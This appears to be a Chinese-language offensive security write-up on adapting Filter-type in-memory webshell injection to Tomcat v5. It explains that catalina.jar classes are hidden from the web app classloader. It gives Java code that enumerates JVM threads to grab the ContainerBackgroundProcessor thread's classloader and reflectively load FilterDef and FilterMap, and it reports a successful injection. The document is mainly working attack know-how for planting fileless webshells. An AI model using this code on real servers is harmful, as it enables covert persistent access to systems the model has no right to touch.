背景说明
Tomcat v5 的⽂档中 Class Loader Definitions  部分存在⼀段区别于 tomcat v6/7/8/9 的⼀段定义
https://tomcat.apache.org/tomcat-5.5-doc/class-loader-howto.html
$CATALINA_HOME/server/lib/catalina.jar   由ClassLoader catalinaLoader  进⾏加载，⽽且该
由该Class Loader加载的类和资源对 web application 不可⻅。
附：Tomcat v6  $CATALINA_HOME/server/lib  的 Class Loader 定义
https://tomcat.apache.org/tomcat-6.0-doc/class-loader-howto.html
$CATALINA_HOME/server/lib/catalina.jar  -> visible
Q: 这部分差异会给实战带来什么问题呢？
A: 由于位于 $CATALINA_HOME/server/lib 下的类对 web app 不可⻅，意味着 web app 的线程上
下⽂类加载器⽆法加载到 catalina.jar 中的类, 如 org.apache.catalina.deploy.FilterDef 
等, 所以会抛出 ClassNotFound 异常, 从⽽导致内存⻢注⼊失败。
问题重现
攻防中，在注⼊ Filter 型内存⻢时为了减少编译时的依赖，通常会使⽤下⾯的代码⽚段来反射来加载相关
类
这段代码在 tomcat v6/7/8/9 上基本满⾜需求，但是当⽬标是 Tomcat v5 时，会抛出异常: 
ClassNotFound
如图
因为此时加载⽬标类的 ClassLoader 不是 catalinaLoader 。
解决⽅案
Class.forName 作为⼀个⽤来加载类的静态⽅法，共有两种⽅式：
Class.forName(String className)
Class.forName(String name, boolean initialize, ClassLoader loader) 
使⽤第⼀种时，默认 loader 的值为当前类的类加载器，⽽不是 catalinaLoader ，⾃然⽆法成功加载。
try{
// tomcat v8/9
  filterDef = 
Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
  filterMap = 
Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
}catch (Exception e){
// tomcat v6/7
  filterDef = 
Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
  filterMap = 
Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
}
解决思路
调⽤ Class.forName() 进⾏加载类时指定 loader 为 catalinaLoader  即可
问题转变成了如何获取 catalinaLoader  。
解决思路
既然 web app 线程的上下⽂类加载器不⾏，那么只需要在 tomcat 的其他线程⾥找到 
catalinaLoader  即可
遍历线程，成功在 ContainerBackgroundProcessor  线程⾥找到了符合预期的 ClassLoader,  其 
URLClassPath  定义⾥有所需要的 catalina.jar 。
如图
问题解决了 80%，成功加载到 FilterDef  
如图
Class.forName("org.apache.catalina.deploy.FilterDef", true, catalinaLoader) 
Class.forName("org.apache.catalina.deploy.FilterDef", true, 
threads[32].getContextClassLoader()); 
剩下 20% 只需要把遍历线程的的步骤⽤代码实现即可
成功加载到 FilterDef/FilterMap
测试效果：在 Tomcat v5 注⼊内存⻢
Method method = Thread.class.getDeclaredMethod("getThreads");
method.setAccessible(true);
Thread[] threads = (Thread[]) method.invoke(null);
for (int i = 0; i < threads.length; i++) {
  // 适配 tomcat v5 的 Class Loader 问题
  if (threads[i].getName().contains("ContainerBackgroundProcessor")) {
    catalinaLoader = threads[i].getContextClassLoader();
    return;
  }
}